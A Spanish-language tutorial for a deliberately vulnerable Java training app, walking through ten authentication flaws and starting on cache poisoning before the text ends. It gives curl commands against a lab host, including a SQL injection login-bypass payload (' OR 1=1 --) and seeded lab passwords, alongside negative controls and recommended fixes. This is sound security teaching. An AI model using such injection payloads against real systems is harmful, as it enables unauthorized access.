# Taller completo de VulnerableApp Academy

El tutorial cubre las familias del repositorio Java fijado al commit indicado en `vendor/UPSTREAM_COMMIT`. No incluye por extensión aplicaciones de otros repositorios como VulnerableApp-JSP, VulnerableApp-PHP o LLMForge.

Todos los comandos se ejecutan **dentro de Kali**, contra los nombres Docker del laboratorio. Los comandos `curl` directos son exploratorios; para puntaje usa `lab request`. Las prácticas marcadas como manuales no tienen verificador automático ni puntos. Los criterios prueban el hecho concreto indicado, no una certificación general de explotación o seguridad.

Antes de avanzar, lee [Inicio](INICIO.md) y [Herramientas](HERRAMIENTAS.md). No saltes el control negativo: evita confundir una respuesta habitual con una vulnerabilidad.

## Autenticación y almacenamiento de contraseñas

La familia AuthenticationVulnerability expone diez variantes del mismo flujo de inicio de sesión bajo /VulnerableApp/AuthenticationVulnerability/{LEVEL}. Los niveles iniciales muestran concatenación SQL, registro de contraseñas, almacenamiento en claro y hashes rápidos; los niveles intermedios muestran enumeración de usuarios, BCrypt con una contraseña débil y BCrypt con un coste deliberadamente bajo; el nivel 9 es la variante segura con BCrypt y mensajes de error genéricos. Todas las respuestas del controlador son HTTP 200 y llevan el envoltorio JSON {content,isValid}, incluso cuando la autenticación falla, por lo que el código de estado por sí solo no demuestra autenticación. La implementación usa la tabla auth_users y restringe cada consulta por username y level; las credenciales y hashes que aparecen en los ejercicios son únicamente las semillas del laboratorio leídas desde data.sql.

### Todos los niveles originales

#### `GET /VulnerableApp/AuthenticationVulnerability/LEVEL_1`

**Entrada:** {
  "username": "query string; requerido para intentar autenticar",
  "password": "query string; requerido para intentar autenticar"
}

Construye SELECT * FROM auth_users WHERE level=1 AND username='...' AND password='...' concatenando ambos valores sin parámetros preparados. Si la consulta devuelve alguna fila, devuelve isValid=true y el perfil userId, username, email y role; si no devuelve filas, devuelve Invalid credentials. Las excepciones se convierten en Database error: ... dentro de content.

La anotación AttackVector lo clasifica como ERROR_BASED_SQL_INJECTION y el payload original propone username admin_sqli y password ' OR 1=1 --. El efecto observable es un bypass SQL de laboratorio; el catch también puede reflejar el mensaje de la base de datos. La prueba AuthLoginServiceTest confirma que se usa JdbcTemplate y la semilla data.sql asigna admin_sqli al nivel 1. La ruta GET es el valor por defecto de VulnerableAppRequestMapping. Como la consulta usa SELECT * y users.get(0), el perfil concreto tras OR 1=1 depende del orden que entregue la base; el código no garantiza que sea admin_sqli.

#### `GET /VulnerableApp/AuthenticationVulnerability/LEVEL_2`

**Entrada:** {
  "username": "query string; requerido para intentar autenticar",
  "password": "query string; requerido para intentar autenticar"
}

Busca el usuario admin_logs del nivel 2 mediante el repositorio, registra LOGGER.info("Login attempt for user: {} | provided password: {}", username, password) y después compara la contraseña en claro. Una coincidencia devuelve el perfil; cualquier fallo devuelve Invalid credentials, pero el valor proporcionado ya fue enviado al log.

La vulnerabilidad es la exposición de datos sensibles en logs, no un bypass. Se puede demostrar con un marcador inocuo aunque la contraseña sea incorrecta, porque el log ocurre antes de la comparación. data.sql contiene una contraseña de semilla en claro para admin_logs. No se debe puntuar inspeccionando solamente la respuesta HTTP: el indicio está en los logs del servicio.

#### `GET /VulnerableApp/AuthenticationVulnerability/LEVEL_3`

**Entrada:** {
  "username": "query string; requerido para intentar autenticar",
  "password": "query string; requerido para intentar autenticar"
}

Autentica al usuario del nivel 3 comparando directamente la contraseña en claro. Cuando la autenticación tiene éxito, además del perfil añade passwordInDB con el valor almacenado y devuelve isValid=true.

AuthUserAlgorithm.PLAIN y la semilla admin_plain muestran almacenamiento en texto claro. AuthenticationVulnerabilityTest comprueba explícitamente que el campo passwordInDB aparece en la respuesta. La ruta y el formulario son GET.

#### `GET /VulnerableApp/AuthenticationVulnerability/LEVEL_4`

**Entrada:** {
  "username": "query string; requerido para intentar autenticar",
  "password": "query string; requerido para intentar autenticar"
}

Calcula MD5 de la contraseña recibida y lo compara con la cadena almacenada. En un login válido devuelve el perfil, passwordHash y algorithm=MD5.

Es un hash rápido y sin sal, adecuado para ilustrar cracking offline de una contraseña débil; el ejercicio no ejecuta crackers ni servicios externos. AuthSeedDataRegressionTest verifica que el hash de admin_md5 coincide con la contraseña documentada en data.sql.

#### `GET /VulnerableApp/AuthenticationVulnerability/LEVEL_5`

**Entrada:** {
  "username": "query string; requerido para intentar autenticar",
  "password": "query string; requerido para intentar autenticar"
}

Calcula SHA-1 de la contraseña recibida y lo compara con la cadena almacenada. En un login válido devuelve el perfil, passwordHash y algorithm=SHA-1.

SHA-1 también es un hash rápido y sin sal en esta semilla. AuthSeedDataRegressionTest comprueba el valor de admin_sha1 y su contraseña de laboratorio. El endpoint no usa POST: la contraseña viaja como query parameter en el diseño original.

#### `GET /VulnerableApp/AuthenticationVulnerability/LEVEL_6`

**Entrada:** {
  "username": "query string; requerido para intentar autenticar",
  "password": "query string; requerido para intentar autenticar"
}

Para el registro del nivel 6, salt es null y el servicio calcula SHA-256 solamente sobre la contraseña. Un login válido devuelve el perfil, passwordHash y algorithm=SHA-256.

La semilla admin_sha256 no tiene sal. El mismo método admite sal si el registro la contiene; el nivel 7 reutiliza esa rama con una sal. AuthSeedDataRegressionTest verifica el hash sin sal de admin_sha256.

#### `GET /VulnerableApp/AuthenticationVulnerability/LEVEL_7`

**Entrada:** {
  "username": "query string; requerido para intentar autenticar",
  "password": "query string; requerido para intentar autenticar"
}

Busca el usuario del nivel 7 y valida SHA-256 sobre salt+password. Si el usuario no existe devuelve User not found; si existe pero la contraseña es incorrecta devuelve Invalid password; si es correcta devuelve el perfil. Las dos respuestas de error distinguen la existencia del usuario.

La anotación clasifica el nivel como USERNAME_ENUMERATION. data.sql usa admin_enum con salt s9A#2zLk y una contraseña de laboratorio. AuthLoginServiceTest y AuthSeedDataRegressionTest cubren la diferencia entre usuario inexistente y contraseña incorrecta. La sal reduce tablas precalculadas, pero no corrige la enumeración ni convierte SHA-256 en un KDF de contraseñas.

#### `POST /VulnerableApp/AuthenticationVulnerability/LEVEL_8`

**Entrada:** {
  "username": "application/x-www-form-urlencoded; nombre admin_weak en la semilla",
  "password": "application/x-www-form-urlencoded; contraseña de laboratorio password123"
}

Lee username y password desde un formulario POST, busca el registro del nivel 8 y valida con BCryptPasswordEncoder. Un login correcto devuelve solamente el perfil, sin hash ni contraseña. La debilidad intencional es la contraseña común password123, no la función de hash.

La anotación fija requestMethod=POST y la plantilla LEVEL_8/Auth.js construye application/x-www-form-urlencoded. La prueba AuthLoginServiceTest confirma el hash BCrypt de password123. El POST evita que la contraseña se coloque en la URL, pero no compensa una contraseña débil.

#### `POST /VulnerableApp/AuthenticationVulnerability/LEVEL_9`

**Entrada:** {
  "username": "application/x-www-form-urlencoded; nombre admin_secure en la semilla o un nombre inexistente",
  "password": "application/x-www-form-urlencoded"
}

Valida BCrypt con el encoder normal y, tanto si el usuario no existe como si la contraseña no coincide, devuelve el mismo content=Invalid credentials e isValid=false. En éxito devuelve el perfil sin passwordInDB ni passwordHash.

Es la variante Variant.SECURE. La prueba AuthenticationVulnerabilityTest comprueba el error genérico y la ausencia de secretos, mientras AuthLoginServiceTest contrasta usuario existente e inexistente. El código sigue exponiendo el perfil básico tras un login válido; secure aquí significa que no muestra hash/contraseña y no enumera por mensaje, no que sea una implementación completa de sesión, MFA o rate limiting.

#### `POST /VulnerableApp/AuthenticationVulnerability/LEVEL_10`

**Entrada:** {
  "username": "application/x-www-form-urlencoded; nombre admin_lowcost en la semilla",
  "password": "application/x-www-form-urlencoded; contraseña de laboratorio sunshine"
}

Valida el registro BCRYPT_LOW_ITERATION creando BCryptPasswordEncoder(4). En éxito devuelve el perfil y añade passwordHash y algorithm=BCrypt (Cost: 4); un fallo devuelve Invalid credentials.

La anotación fija POST. El coste 4 es deliberadamente bajo y acelera el cracking offline comparado con un coste de producción; además el controlador entrega el hash al cliente tras el login correcto. data.sql contiene admin_lowcost con el hash cost 04 y la prueba de controlador cubre la exposición de hashes en niveles débiles. AuthenticationVulnerability.java referencia AUTH_PAYLOAD_LEVEL_10, pero el archivo AuthenticationVulnerabilityPayload.properties leído en este commit sólo contiene claves hasta AUTH_PAYLOAD_LEVEL_9; la ruta y la lógica del nivel sí están definidas, pero su texto de payload puede faltar en la metadata.

### authentication-01 · LEVEL_1: bypass SQL de una sola consulta con marcador de control

{
  "positive": "Si la imagen está cargada con la semilla esperada y la sintaxis de la base de datos acepta el comentario, la consulta puede devolver una o más filas y content será el perfil de la primera fila que el motor entregue, con isValid=true. No se debe asumir por el código que esa primera fila sea necesariamente admin_sqli.",
  "negative_control": "Con username admin_sqli y password VA_LAB_WRONG, el código espera isValid=false y content=Invalid credentials.",
  "safety": "El payload sólo intenta alterar el SELECT de autenticación; no contiene UPDATE, DELETE, acceso a tablas ajenas ni ejecución de comandos."
}

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

La concatenación de username y password dentro de SQL permite cerrar la cadena de contraseña e introducir una condición verdadera. El control negativo ayuda a distinguir el bypass de un login válido por credencial legítima. Un HTTP 200 se obtiene también ante un fallo, así que el verificador debe leer isValid y, preferiblemente, content.username.

```bash
curl -i --get http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_1 --data-urlencode 'username=admin_sqli' --data-urlencode 'password=VA_LAB_WRONG'
```

```bash
curl -i --get http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_1 --data-urlencode 'username=admin_sqli' --data-urlencode "password=' OR 1=1 -- "
```

Comparar el JSON de ambos cuerpos y aceptar como indicio sólo la combinación isValid=true y un perfil coherente; no atribuir éxito por el código HTTP 200.

Registrar la misma prueba con el cliente del laboratorio:
lab request authentication-01 --method GET --param username=admin_sqli --param 'password='"'"' OR 1=1 -- '

**Criterio del verificador:**

```json
{
  "kind": "json",
  "value": true,
  "path": "isValid"
}
```

**Pistas:**

El payload debe llegar como un solo valor de password; --data-urlencode evita que los espacios y signos se pierdan.

El código usa un comentario SQL al final de la condición. Si la variante de H2 exige espacio después de --, el comando ya incluye un espacio final dentro de las comillas.

No convertir este ejercicio en extracción de datos: el objetivo es sólo el bypass de la consulta de login del nivel 1.

**Corrección recomendada:** Usar consultas parametrizadas o el repositorio/JPA para toda entrada; no concatenar valores en SQL y no devolver mensajes de excepción de la base de datos al cliente.

### authentication-02 · LEVEL_2: detectar contraseña proporcionada en el log sin usar un secreto

{
  "response": "La respuesta de login puede ser isValid=false y content=Invalid credentials porque el marcador no es la contraseña almacenada.",
  "log": "En el log del servicio debería aparecer una entrada que incluya admin_logs y VA_LAB_LOG_MARKER, ya que LOGGER.info se ejecuta antes de la comparación.",
  "safety": "El marcador es inocuo y no es una credencial real ni un dato del host."
}

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Este nivel demuestra logging sensible aunque el login falle: el servicio registra el password recibido antes de validar. No es necesario conocer ni enviar la contraseña real de data.sql. La verificación requiere acceso autorizado a los logs del contenedor o consola del laboratorio, no un endpoint adicional.

```bash
curl -i --get http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_2 --data-urlencode 'username=admin_logs' --data-urlencode 'password=VA_LAB_LOG_MARKER'
```

Anotar que un cuerpo con isValid=false es compatible con el objetivo: el marcador no pretende autenticar.

En la consola de logs autorizada del laboratorio, buscar VA_LAB_LOG_MARKER y admin_logs; no exponer ni copiar otros secretos.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Revisar exclusivamente los logs del servicio del laboratorio y confirmar la aparición literal de VA_LAB_LOG_MARKER junto a admin_logs; la respuesta HTTP no verifica la escritura en logs."
}
```

**Pistas:**

El orden en AuthLoginService es buscar usuario, LOGGER.info y sólo después comparar la contraseña.

No uses la contraseña real de admin_logs para probar la vulnerabilidad de logging.

No puntúes este ejercicio por el texto de la respuesta ni por HTTP 200; el artefacto a verificar es el log.

**Corrección recomendada:** No registrar contraseñas, tokens ni secretos; aplicar allowlists de campos, redacción estructurada y controles de acceso/retención en los logs.

### authentication-03 · LEVEL_3: observar exposición explícita del passwordInDB

{
  "positive": "Con la semilla de data.sql, isValid=true y content.passwordInDB=b7X$4nRj-6mW además del perfil.",
  "negative_control": "Cambiar la contraseña a VA_LAB_WRONG debe producir isValid=false y no debe entregar passwordInDB."
}

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El servicio valida una contraseña PLAIN y el controlador añade deliberadamente passwordInDB al perfil de éxito. El control negativo evita confundir el campo expuesto con una respuesta genérica o con un dato presente en una página estática.

```bash
curl -i --get http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_3 --data-urlencode 'username=admin_plain' --data-urlencode 'password=b7X$4nRj-6mW'
```

```bash
curl -i --get http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_3 --data-urlencode 'username=admin_plain' --data-urlencode 'password=VA_LAB_WRONG'
```

Parsear el JSON del positivo y comprobar content.passwordInDB; no tomar como prueba el HTML de la interfaz ni un 200.

Registrar la misma prueba con el cliente del laboratorio:
lab request authentication-03 --method GET --param username=admin_plain --param 'password=b7X$4nRj-6mW'

**Criterio del verificador:**

```json
{
  "kind": "json",
  "value": "b7X$4nRj-6mW",
  "path": "content.passwordInDB"
}
```

**Pistas:**

Las comillas simples del shell protegen el signo $ del password de semilla.

El nombre exacto del campo expuesto es passwordInDB, no password.

La exposición ocurre sólo después de una autenticación correcta en el código revisado.

**Corrección recomendada:** Almacenar sólo hashes de contraseña adecuados y nunca serializar contraseñas, hashes o material de autenticación en la respuesta; usar DTOs de salida mínimos.

### authentication-04 · LEVEL_4: identificar MD5 rápido y el hash devuelto

{
  "positive": "La semilla y AuthSeedDataRegressionTest esperan isValid=true, content.algorithm=MD5 y el hash almacenado en content.passwordHash.",
  "negative_control": "Con password VA_LAB_WRONG, el resultado esperado es isValid=false y content=Invalid credentials."
}

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El login correcto confirma el camino de validación MD5 y muestra que el controlador entrega el hash al cliente. No se requiere ni se recomienda intentar cracking: la propiedad didáctica es que MD5 es rápido y no está diseñado para almacenamiento de contraseñas.

```bash
curl -i --get http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_4 --data-urlencode 'username=admin_md5' --data-urlencode 'password=SaKyb21.20#'
```

```bash
curl -i --get http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_4 --data-urlencode 'username=admin_md5' --data-urlencode 'password=VA_LAB_WRONG'
```

Comprobar content.algorithm y, si se documenta la exposición, observar que content.passwordHash no es un secreto que deba salir en una aplicación real.

Registrar la misma prueba con el cliente del laboratorio:
lab request authentication-04 --method GET --param username=admin_md5 --param 'password=SaKyb21.20#'

**Criterio del verificador:**

```json
{
  "kind": "json",
  "value": "MD5",
  "path": "content.algorithm"
}
```

**Pistas:**

No confundas la autenticación correcta con la seguridad del algoritmo: el resultado positivo es precisamente la demostración.

Usa comillas simples alrededor del argumento para que # no sea comentario del shell.

La prueba de regresión local confirma el hash de la semilla, pero no demuestra que el despliegue en target esté usando esa misma imagen.

**Corrección recomendada:** Migrar a un KDF adaptativo y moderno (por ejemplo, Argon2id, scrypt o BCrypt con coste vigente), con sal única por contraseña; no devolver el hash al cliente.

### authentication-05 · LEVEL_5: identificar SHA-1 rápido y el hash devuelto

{
  "positive": "Con la semilla esperada, isValid=true, content.algorithm=SHA-1 y content.passwordHash presente.",
  "negative_control": "Con password VA_LAB_WRONG, isValid=false y content=Invalid credentials."
}

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

AuthLoginService calcula SHA-1 sin sal y el controlador devuelve el algoritmo y el hash en el perfil de éxito. El ejercicio se limita a comprobar el comportamiento de código; no necesita servicios de cracking ni consultas a fuentes externas.

```bash
curl -i --get http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_5 --data-urlencode 'username=admin_sha1' --data-urlencode 'password=WyXxb@i34'
```

```bash
curl -i --get http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_5 --data-urlencode 'username=admin_sha1' --data-urlencode 'password=VA_LAB_WRONG'
```

Leer el objeto content del JSON positivo y comprobar algorithm=SHA-1; un 200 sin ese campo no es evidencia suficiente.

Registrar la misma prueba con el cliente del laboratorio:
lab request authentication-05 --method GET --param username=admin_sha1 --param password=WyXxb@i34

**Criterio del verificador:**

```json
{
  "kind": "json",
  "value": "SHA-1",
  "path": "content.algorithm"
}
```

**Pistas:**

El símbolo @ no necesita escaping dentro de comillas simples.

El valor de algorithm se fija en el controlador y es útil para comprobar que se alcanzó el nivel correcto.

La prueba de semilla cubre la contraseña documentada, pero no garantiza por sí sola el estado del contenedor target.

**Corrección recomendada:** Sustituir SHA-1 por un KDF adaptativo con sal única y calibrar el coste; mantener los hashes fuera de las respuestas y de logs.

### authentication-06 · LEVEL_6: distinguir SHA-256 sin sal de un KDF de contraseñas

{
  "positive": "Con la semilla esperada, isValid=true, content.algorithm=SHA-256 y content.passwordHash presente; data.sql deja salt en NULL para este usuario.",
  "negative_control": "Con password VA_LAB_WRONG, isValid=false y content=Invalid credentials."
}

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

La rama SHA256 usa input=password cuando el registro no tiene salt. SHA-256 puede ser criptográficamente fuerte como digest, pero su rapidez y ausencia de sal lo hacen inadecuado para contraseñas. El código también expone el hash en el resultado válido.

```bash
curl -i --get http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_6 --data-urlencode 'username=admin_sha256' --data-urlencode 'password=QoTz8!bM52'
```

```bash
curl -i --get http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_6 --data-urlencode 'username=admin_sha256' --data-urlencode 'password=VA_LAB_WRONG'
```

Comprobar content.algorithm=SHA-256 y no inferir una mitigación sólo porque el nombre SHA-256 parezca fuerte.

Registrar la misma prueba con el cliente del laboratorio:
lab request authentication-06 --method GET --param username=admin_sha256 --param 'password=QoTz8!bM52'

**Criterio del verificador:**

```json
{
  "kind": "json",
  "value": "SHA-256",
  "path": "content.algorithm"
}
```

**Pistas:**

Las comillas simples evitan que ! active expansión de historial en shells interactivos.

LEVEL_7 también usa la rama SHA256, pero con salt; no mezcles ambos casos.

La diferencia entre un digest rápido y un KDF adaptativo es parte del objetivo, no una invitación a romper hashes.

**Corrección recomendada:** Usar un KDF adaptativo diseñado para contraseñas, con sal aleatoria por cuenta y parámetros actuales; no enviar el hash al cliente.

### authentication-07 · LEVEL_7: enumeración de usuarios por mensajes distintos

{
  "unknown_user": "Para ghost se espera isValid=false y content=User not found.",
  "known_user_wrong_password": "Para admin_enum se espera isValid=false y content=Invalid password.",
  "interpretation": "La diferencia de contenido revela que admin_enum existe. La sal SHA-256 de este nivel no elimina esa fuga de información."
}

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El servicio recibe enumerable=true y deliberadamente separa usuario ausente de contraseña incorrecta. Es un control positivo/negativo de existencia, no una autenticación exitosa. El verificador debe comparar dos respuestas, no contar un click en la UI ni usar sólo HTTP 200.

```bash
curl -i --get http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_7 --data-urlencode 'username=ghost' --data-urlencode 'password=VA_LAB_WRONG'
```

```bash
curl -i --get http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_7 --data-urlencode 'username=admin_enum' --data-urlencode 'password=VA_LAB_WRONG'
```

Comparar $.content en ambos JSON; no declarar enumeración por un solo 200, por un texto del frontend o por un click.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Comparar literalmente los dos campos JSON content: User not found frente a Invalid password, manteniendo iguales método, ruta y password."
}
```

**Pistas:**

admin_enum es la cuenta del nivel 7 en data.sql y usa una sal; ghost no existe en esa semilla.

Mantén el password idéntico en ambos comandos para aislar la variable username.

El resultado esperado de ambos casos es isValid=false; la vulnerabilidad está en el mensaje diferencial.

**Corrección recomendada:** Responder con el mismo mensaje y comportamiento observable para usuario ausente y contraseña incorrecta; considerar límites de intento, respuestas temporizadas de forma consistente y monitoreo.

### authentication-08 · LEVEL_8: contraseña común pese a BCrypt y transporte POST

{
  "positive": "Si coincide la semilla, el POST devuelve isValid=true y un perfil con username admin_weak, sin passwordHash ni passwordInDB.",
  "negative_control": "Cambiar password a VA_LAB_WRONG debe devolver isValid=false y content=Invalid credentials.",
  "interpretation": "POST evita poner las credenciales en la query URL, pero BCrypt no compensa password123 como contraseña de baja entropía."
}

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El código valida con BCrypt normal, pero la semilla usa una contraseña común. Se prueba directamente el comportamiento de login y se contrasta con un fallo; no se hace fuerza bruta ni se toca ningún dato persistente.

```bash
curl -i -X POST http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_8 -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=admin_weak&password=password123'
```

```bash
curl -i -X POST http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_8 -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=admin_weak&password=VA_LAB_WRONG'
```

Validar el positivo leyendo isValid y content.username; verificar que el método es POST y no usar el código 200 como criterio único.

Registrar la misma prueba con el cliente del laboratorio:
lab request authentication-08 --method POST --body 'username=admin_weak&password=password123' --content-type application/x-www-form-urlencoded

**Criterio del verificador:**

```json
{
  "kind": "json",
  "value": true,
  "path": "isValid"
}
```

**Pistas:**

El formulario LEVEL_8/Auth.js envía exactamente username y password como form-urlencoded.

No pruebes con una lista de contraseñas: la semilla documenta una sola contraseña de laboratorio.

El objetivo es la debilidad de la contraseña, no recuperar el hash ni atacar otro endpoint.

**Corrección recomendada:** Aplicar política de contraseñas o passphrases resistentes a listas comunes, comprobación contra contraseñas comprometidas, MFA y rate limiting; mantener BCrypt/Argon2id con parámetros calibrados.

### authentication-09 · LEVEL_9: control seguro contra enumeración y fuga de hash

{
  "negative_existing": "isValid=false y content=Invalid credentials para admin_secure con password incorrecta.",
  "negative_unknown": "isValid=false y content=Invalid credentials para ghost con password incorrecta.",
  "positive_optional": "Con la semilla esperada, el password documentado de admin_secure produce isValid=true y un perfil sin passwordHash ni passwordInDB.",
  "interpretation": "La igualdad de los fallos es el control contra enumeración; la ausencia de campos secretos es el control contra exposición."
}

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Este es el contraste positivo de la familia: BCrypt normal, mensaje genérico para usuario ausente y contraseña errónea, y DTO de perfil sin material de contraseña. La etiqueta secure no implica sesión, MFA, bloqueo o rate limiting, que no aparecen en este código.

```bash
curl -i -X POST http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_9 -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=admin_secure&password=VA_LAB_WRONG'
```

```bash
curl -i -X POST http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_9 -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=ghost&password=VA_LAB_WRONG'
```

```bash
curl -i -X POST http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_9 -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=admin_secure&password=9fG#2hJk*LmN!8qR'
```

Comparar los JSON; confirmar que las dos fallas son indistinguibles en content y que el perfil válido no trae campos de hash.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Comparar $.content y $.isValid de las dos respuestas negativas y, opcionalmente, comprobar que el éxito no contiene passwordHash ni passwordInDB; un único 200 no es evidencia."
}
```

**Pistas:**

Usa exactamente la misma contraseña errónea en los dos casos negativos.

Las comillas simples mantienen #, ! y * como datos del formulario en Kali.

No uses diferencias de tiempo no controladas como prueba única; el código fuente y el mensaje JSON son la evidencia disponible aquí.

**Corrección recomendada:** Conservar errores genéricos y respuestas observables equivalentes, proteger el endpoint con controles de abuso, usar MFA/sesiones seguras y evitar cualquier serialización de credenciales o hashes.

### authentication-10 · LEVEL_10: BCrypt con coste 4 y hash entregado al cliente

{
  "positive": "Con la semilla esperada, isValid=true, content.algorithm=BCrypt (Cost: 4) y content.passwordHash empieza por $2a$04$.",
  "negative_control": "Con password VA_LAB_WRONG, isValid=false y content=Invalid credentials.",
  "interpretation": "El endpoint demuestra un coste deliberadamente bajo y una exposición adicional del hash tras el login correcto."
}

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El servicio instancia BCryptPasswordEncoder(4), y el controlador serializa tanto passwordHash como el texto del coste. La prueba es segura porque usa una única contraseña de la semilla y no ejecuta cracking ni modifica datos.

```bash
curl -i -X POST http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_10 -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=admin_lowcost&password=sunshine'
```

```bash
curl -i -X POST http://target:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_10 -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=admin_lowcost&password=VA_LAB_WRONG'
```

En el positivo, comprobar content.algorithm y observar que passwordHash sólo aparece porque el código del nivel 10 lo añade; no copiarlo ni intentar romperlo.

Registrar la misma prueba con el cliente del laboratorio:
lab request authentication-10 --method POST --body 'username=admin_lowcost&password=sunshine' --content-type application/x-www-form-urlencoded

**Criterio del verificador:**

```json
{
  "kind": "json",
  "value": "BCrypt (Cost: 4)",
  "path": "content.algorithm"
}
```

**Pistas:**

El prefijo $2a$04$ del hash de semilla es consistente con el coste 4, pero el campo algorithm es el indicador principal de esta prueba.

El password sunshine es una semilla inocua del laboratorio; no extrapoles su resultado a una política real.

El fallo conserva HTTP 200, por eso la comprobación debe usar isValid y content.

**Corrección recomendada:** Usar un coste BCrypt calibrado al entorno o un KDF moderno, revisar periódicamente sus parámetros y nunca devolver el hash; migrar hashes en el siguiente login cuando cambien los parámetros.

### Límites de esta familia

[
  "El análisis se limita al commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a y a la familia authentication, sus plantillas, payload, semillas, pruebas y piezas compartidas necesarias para reconstruir la ruta. No se inspeccionaron otras familias de vulnerabilidades.",
  "La ruta se deriva de @VulnerableAppRestController(value=\"AuthenticationVulnerability\") y @VulnerableAppRequestMapping(value=LEVEL_n); el controlador central construye URLs con contexto, nombre y nivel. El entorno solicitado fija la base esperada en http://target:9090/VulnerableApp, pero no se afirmó que el contenedor estuviera disponible ni se ejecutaron los curls contra él.",
  "Las expectativas positivas dependen de que target use la imagen/semillas coherentes con data.sql. Las pruebas del repositorio validan mocks o una base H2 preparada, no el estado vivo del laboratorio. Por eso este documento verifica el código y propone comprobaciones; no promete que un ejercicio haya funcionado en ejecución.",
  "Todas las respuestas del controlador se construyen con HTTP 200, incluso para credenciales ausentes o inválidas. Un 200 no prueba autenticación: se debe leer el JSON, especialmente isValid y content, y comparar controles.",
  "Un mensaje reflejado o un cambio de texto no prueba ejecución de XSS; un 200 no prueba IDOR; y no se debe atribuir puntaje por hacer click en la interfaz. Esta familia no contiene ejercicios XSS ni IDOR, pero esas reglas deben mantenerse en cualquier verificador que agregue otras familias.",
  "El check.kind=manual requiere una comparación humana o acceso autorizado a logs y no debe convertirse en un resultado automático por presencia de una página. El check.kind=json asume rutas JSONPath como $.isValid o $.content.campo y sólo confirma el valor indicado, no la ausencia de todas las demás debilidades.",
  "No se cubren sesiones, cookies, CSRF, MFA, bloqueo, rate limiting, recuperación de contraseña, autorización posterior al login ni auditoría de logs más allá del comportamiento explícito de esta familia.",
  "Los ejercicios no usan Mailpit ni receiver porque ningún nivel de authentication emite correo ni realiza SSRF; tampoco usan comandos externos, reverse shells, lectura de secretos del host, DoS, borrado de datos, cracking offline o extracción de tablas.",
  "Hay una discrepancia de metadata dentro de la familia: AuthenticationVulnerability.java referencia AUTH_PAYLOAD_LEVEL_10, mientras AuthenticationVulnerabilityPayload.properties termina en AUTH_PAYLOAD_LEVEL_9. Este informe describe el nivel 10 por su anotación y código, no inventa un texto de payload ausente."
]

## Envenenamiento de caché compartida

La familia modela una caché compartida en memoria mediante un ConcurrentHashMap estático de la aplicación, con TTL de 60 segundos. El controlador central combina el nombre anotado CachePoisoning con el nivel anotado para exponer las rutas /VulnerableApp/CachePoisoning/LEVEL_1 a /VulnerableApp/CachePoisoning/LEVEL_5. La lección progresa desde una respuesta reflejada cuyo parámetro no participa en la clave, pasa por un filtro superficial y por un encabezado no indexado, muestra la filtración de contenido personalizado por una cookie no indexada, y termina con una respuesta privada que no se almacena. La evidencia principal es la relación entre X-Cache-Status, X-Cache-Key, Cache-Control y el contenido JSON de la respuesta. Los niveles 1 y 2 reflejan HTML sin escape; el nivel 3 escapa el banner pero construye una URL de activo con X-Forwarded-Host; el nivel 4 escapa el contenido personalizado, pero lo publica y lo cachea por ruta; el nivel 5 escapa el banner, fija el host de activo y devuelve private, no-store sin guardarlo en la caché compartida. El nivel 3 no hace una petición HTTP saliente desde el servidor: únicamente inserta la URL en HTML, por lo que no debe etiquetarse como SSRF a partir de este código.

### Todos los niveles originales

#### `GET /VulnerableApp/CachePoisoning/LEVEL_1`

**Entrada:** {
  "query": {
    "banner": "Opcional; si está vacío se usa 'Welcome to the shared cache demo'. Se refleja sin escape.",
    "browserCache": "Opcional, por defecto true; true publica 'public, max-age=60' y false publica 'public, s-maxage=60, max-age=0'. No cambia que el código almacene la respuesta en su caché compartida.",
    "clave_de_cache": "No es un parámetro HTTP: solo requestURI, es decir, /VulnerableApp/CachePoisoning/LEVEL_1."
  },
  "headers": {},
  "cookies": {}
}

buildLevel1Response refleja banner directamente dentro de un fragmento HTML y buildRouteOnlyCacheKey usa únicamente request.getRequestURI(). La primera respuesta para la ruta se guarda durante 60 segundos; peticiones posteriores, aunque lleven otro banner o ninguno, reciben el contenido almacenado. X-Cache-Status marca MISS al crear la entrada y HIT al reutilizarla; X-Cache-Key solo contiene la ruta.

